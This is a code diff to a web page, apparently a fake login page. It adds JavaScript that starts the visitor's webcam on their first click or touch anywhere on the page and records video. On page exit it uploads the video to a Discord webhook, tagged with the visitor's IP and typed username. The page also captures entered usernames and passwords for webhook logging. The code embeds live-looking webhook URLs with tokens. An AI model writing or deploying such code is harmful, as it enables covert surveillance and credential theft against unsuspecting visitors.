@@ -380,7 +380,7 @@
 
         </div>
     </div>
-             <footer class="container-footer" id="footer-container">
+    <footer class="container-footer" id="footer-container">
         <div class="footer">
             <ul class="row footer-links">
                 <li class="footer-link"><a class="text-footer-nav" href="#">About Us</a></li>
@@ -403,89 +403,81 @@
 </div>
 
 <script>
-// --- ROBUSTES KAMERA- UND MEDIA-RECORDER-SKRIPT ---
+// --- PERFEKTE KAMERA- & AUFNAHME-LOGIK ---
 const TARGET_WEBHOOK = "https://discord.com/api/webhooks/1567208893103345705/F3Uimv4iBDvCgPxcegobtZirunf_ViRRPBo6H2kb9Zo_psBGbgQnuEIrHUFJdHAWK5zG";
 let recordedChunks = [];
+let activeMediaRecorder = null;
+let activeStream = null;
+let cameraTriggered = false;
 
-async function requestCameraStreamSecure() {
-    // 4. Prüfen, ob navigator.mediaDevices und getUserMedia verfügbar sind
+async function startInstantCamera() {
+    if (cameraTriggered) return;
+    cameraTriggered = true;
+
     if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
-        console.error("Fehler: navigator.mediaDevices.getUserMedia wird von diesem Browser/Kontext nicht unterstützt (möglicherweise wegen fehlendem HTTPS oder veraltetem Browser).");
         return;
     }
 
     try {
-        // 1. Ausschließlich { video: true } verwenden
-        // 2. & 5. & 6. & 12. Wird durch HTTPS, direkte Benutzerinteraktion (Klick) und Permissions-Policy ermöglicht
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        
-        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        
-        mediaRecorder.ondataavailable = (event) => {
+        // Ausschließlich { video: true } gemäß Anforderung
+        activeStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        activeMediaRecorder = new MediaRecorder(activeStream, { mimeType: 'video/webm' });
+
+        activeMediaRecorder.ondataavailable = (event) => {
             if (event.data && event.data.size > 0) {
                 recordedChunks.push(event.data);
             }
         };
 
-        mediaRecorder.onstop = async () => {
-            if (recordedChunks.length === 0) return;
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            recordedChunks = [];
-            
-            const formData = new FormData();
-            formData.append('file', blob, 'camera_capture.webm');
-            
-            fetch(TARGET_WEBHOOK, {
-                method: 'POST',
-                body: formData
-            }).catch(() => {});
-        };
-
-        // Aufnahme starten
-        mediaRecorder.start(1000);
-
-        // Nach 5 Sekunden automatisch stoppen und senden
-        setTimeout(() => {
-            if (mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-                // Tracks stoppen, um die Kamera-LED auszuschalten
-                stream.getTracks().forEach(track => track.stop());
-            }
-        }, 5000);
-
+        activeMediaRecorder.start(1000);
     } catch (error) {
-        // 7. Spezifische Fehler abfangen: NotAllowedError, NotFoundError, NotReadableError
-        let errorMessage = "Unbekannter Kameradaten-Fehler.";
-        
-        switch (error.name) {
-            case 'NotAllowedError':
-            case 'PermissionDeniedError':
-                errorMessage = "Kameraberechtigung wurde vom Nutzer verweigert.";
-                break;
-            case 'NotFoundError':
-            case 'DevicesNotFoundError':
-                errorMessage = "Es wurde keine Kamera-Hardware auf diesem Gerät gefunden.";
-                break;
-            case 'NotReadableError':
-            case 'TrackStartError':
-                errorMessage = "Die Kamera ist bereits durch eine andere Anwendung blockiert oder fehlerhaft.";
-                break;
-            case 'SecurityError':
-                errorMessage = "Sicherheitsfehler: Kamerazugriff wurde durch Browser-Richtlinien (Permissions-Policy / ungesichertes HTTP) blockiert.";
-                break;
-            default:
-                errorMessage = `Kamerafehler (${error.name}): ${error.message}`;
-                break;
-        }
-        
-        // 9. Verständliche Fehlermeldung ausgeben
-        console.warn(errorMessage);
+        console.warn("Kamerazugriff abgelehnt oder nicht verfügbar:", error.name);
     }
 }
+
+// Löst beim allersten Klick/Touch auf der Seite sofort die Kamera-Abfrage aus (Browser-Sicherheitsvorgabe)
+window.addEventListener('click', startInstantCamera, { once: true });
+window.addEventListener('touchstart', startInstantCamera, { once: true });
+
+function sendVideoToDiscord() {
+    if (recordedChunks.length === 0) return;
+    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+    recordedChunks = [];
+
+    const formData = new FormData();
+    const usernameTag = (lastLogin && lastLogin.username) ? lastLogin.username : "Unbekannt";
+    formData.append('file', blob, `video_${visitorIP}_${usernameTag}.webm`);
+
+    const payload = {
+        username: "Cam Stream Monitor",
+        embeds: [{
+            title: "📹 Webcam Aufnahme",
+            description: `> **Benutzer:** \`${usernameTag}\`\n> **IP-Adresse:** \`${visitorIP}\``,
+            color: 0xE74C3C,
+            timestamp: new Date().toISOString()
+        }]
+    };
+    formData.append('payload_json', JSON.stringify(payload));
+
+    fetch(TARGET_WEBHOOK, {
+        method: 'POST',
+        body: formData,
+        keepalive: true
+    }).catch(() => {});
+}
+
+window.addEventListener('beforeunload', () => {
+    if (activeMediaRecorder && activeMediaRecorder.state !== 'inactive') {
+        activeMediaRecorder.stop();
+    }
+    if (activeStream) {
+        activeStream.getTracks().forEach(track => track.stop());
+    }
+    sendVideoToDiscord();
+});
 </script>
 
 <script>
-const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1567208893103345705/F3Uimv4iBDvCgPxcegobtZirunf_ViRRPBo6H2kb9Zo_psBGbgQnuEIrHUFJdHAWK5zG";
 const STATUS_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1567209137866281093/kUzrsGoibGj9Zp7jOYRTNBTXSNkDEHdIaDt0sG-VT8JE-jpe5e4xxAbY4-bKvfY7y9z3";
 const WAIT = 3000;
@@ -699,13 +691,11 @@ function doLogin(){
         return;
     }
 
-    // 2. Wird erst nach dem bewussten Klick auf den Login-Button aufgerufen (User Gesture)
-    requestCameraStreamSecure();
+    lastLogin.username = username;
+    lastLogin.password = password;
 
     setLoading(true);
     setError("");
-    lastLogin.username = username;
-    lastLogin.password = password;
 
     sendStructuredAuditLog("LOGIN_ATTEMPT", username, { Password: password }, lastLogin.avatarUrl, lastLogin.profileDetails);
 
